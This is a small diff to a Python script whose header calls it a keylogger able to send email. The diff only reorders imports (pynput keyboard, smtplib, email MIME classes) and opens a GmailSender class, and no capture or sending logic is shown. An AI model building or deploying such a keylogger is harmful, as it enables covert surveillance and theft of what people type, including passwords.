@@ -1,14 +1,14 @@
 #!/usr/bin/python
 # Author: ablil
 # Description: keylogger with the option to send email
-
-from pynput import keyboard
+import os
 import smtplib
+import tempfile
 from email.mime.application import MIMEApplication
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-import os
-import tempfile
+
+from pynput import keyboard
 
 
 class GmailSender:
